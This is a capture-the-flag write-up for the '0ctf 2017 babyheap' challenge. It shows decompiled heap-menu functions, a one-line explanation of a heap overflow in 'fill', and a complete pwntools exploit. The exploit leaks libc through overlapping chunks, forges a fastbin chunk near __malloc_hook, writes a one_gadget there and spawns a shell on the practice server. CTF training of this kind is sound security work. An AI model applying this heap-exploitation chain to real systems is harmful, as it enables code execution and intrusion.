# BUU-0ctf_2017_babyheap

## checksec

```shell
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

## IDA

**create**

```c
void __fastcall sub_D48(__int64 a1)
{
  int i; // [rsp+10h] [rbp-10h]
  int v2; // [rsp+14h] [rbp-Ch]
  void *v3; // [rsp+18h] [rbp-8h]

  for ( i = 0; i <= 15; ++i )
  {
    if ( !*(_DWORD *)(24LL * i + a1) )
    {
      printf("Size: ");
      v2 = sub_138C();
      if ( v2 > 0 )
      {
        if ( v2 > 4096 )
          v2 = 4096;
        v3 = calloc(v2, 1uLL);
        if ( !v3 )
          exit(-1);
        *(_DWORD *)(24LL * i + a1) = 1;
        *(_QWORD *)(a1 + 24LL * i + 8) = v2;
        *(_QWORD *)(a1 + 24LL * i + 16) = v3;
        printf("Allocate Index %d\n", (unsigned int)i);
      }
      return;
    }
  }
}
```

**fill**

```c
__int64 __fastcall sub_E7F(__int64 a1)
{
  __int64 result; // rax
  int v2; // [rsp+18h] [rbp-8h]
  int v3; // [rsp+1Ch] [rbp-4h]

  printf("Index: ");
  result = sub_138C();
  v2 = result;
  if ( (int)result >= 0 && (int)result <= 15 )
  {
    result = *(unsigned int *)(24LL * (int)result + a1);
    if ( (_DWORD)result == 1 )
    {
      printf("Size: ");
      result = sub_138C();
      v3 = result;
      if ( (int)result > 0 )
      {
        printf("Content: ");
        result = sub_11B2(*(_QWORD *)(24LL * v2 + a1 + 16), v3);
      }
    }
  }
  return result;
}
```

**free**

```c
__int64 __fastcall sub_F50(__int64 a1)
{
  __int64 result; // rax
  int v2; // [rsp+1Ch] [rbp-4h]

  printf("Index: ");
  result = sub_138C();
  v2 = result;
  if ( (int)result >= 0 && (int)result <= 15 )
  {
    result = *(unsigned int *)(24LL * (int)result + a1);
    if ( (_DWORD)result == 1 )
    {
      *(_DWORD *)(24LL * v2 + a1) = 0;
      *(_QWORD *)(24LL * v2 + a1 + 8) = 0LL;
      free(*(void **)(24LL * v2 + a1 + 16));
      result = 24LL * v2 + a1;
      *(_QWORD *)(result + 16) = 0LL;
    }
  }
  return result;
}
```

**dump**

```c
int __fastcall sub_1051(__int64 a1)
{
  int result; // eax
  int v2; // [rsp+1Ch] [rbp-4h]

  printf("Index: ");
  result = sub_138C();
  v2 = result;
  if ( result >= 0 && result <= 15 )
  {
    result = *(_DWORD *)(24LL * result + a1);
    if ( result == 1 )
    {
      puts("Content: ");
      sub_130F(*(_QWORD *)(24LL * v2 + a1 + 16), *(_QWORD *)(24LL * v2 + a1 + 8));
      result = puts(byte_14F1);
    }
  }
  return result;
}
```

在`fill`中存在溢出，可以通过`overlapping`泄露libc，再`house_of_spirit`修改`__malloc_hook`。

## exp

```python
from pwn import *
from LibcSearcher import LibcSearcher
from struct import pack
leak = lambda name,addr: log.success('{0} addr ---> {1}'.format(name, hex(addr)))
context.log_level="DEBUG"
#context.arch="amd64"

local=0
binary='./0ctf_2017_babyheap'
#gdb.attach(sh)
if local:
	sh=process(binary)
else:
	sh=remote('node3.buuoj.cn',29355)

elf = ELF(binary,checksec=False)
#libc = ELF('./libc-2.271.so')
#gdb.attach(sh)

def add(size):
    sh.sendlineafter("Command: ","1")
    sh.sendlineafter("Size: ",str(size))
    
def fill(index, size, content):
    sh.sendlineafter("Command: ","2")
    sh.sendlineafter("Index: ",str(index))
    sh.sendlineafter("Size: ",str(size))
    sh.sendlineafter("Content: ",str(content))
    
def free(index):
    sh.sendlineafter("Command: ","3")
    sh.sendlineafter("Index: ",str(index))
    
def show(index):
    sh.sendlineafter("Command: ","4")
    sh.sendlineafter("Index: ",str(index))


#gdb.attach(sh)

add(0x10)  #0
add(0x80)  #1
add(0x100)  #2
add(0x10)  #3


payload = '\x00'*0x10+p64(0)+p64(0x1a1)
fill(0,len(payload),payload)
#gdb.attach(sh)
free(1)
add(0x190) #1
payload = '\x00'*0x80+p64(0)+p64(0x111)
fill(1,len(payload),payload)
free(2)
show(1)

main_arena = u64(sh.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
malloc_hook = main_arena -88 - 0x10
fake_chunk = malloc_hook -0x23
libc_base=main_arena-88-0x3C4B20
one_gadget = libc_base + 0x4526a

leak('main_arena', main_arena)
leak('malloc_hook',malloc_hook)
leak('fake_chunk', fake_chunk)
leak('libc_base', libc_base)

add(0x100) #2

add(0x60) #4
add(0x60) #5

free(4)
payload = p64(0)*3+p64(0x71)+p64(fake_chunk)
fill(3,len(payload),payload)
add(0x60) #4
add(0x60) #6
payload = 'a'*0x13+p64(one_gadget)
fill(6,len(payload),payload)
add(0x10) #7

sh.interactive()
```

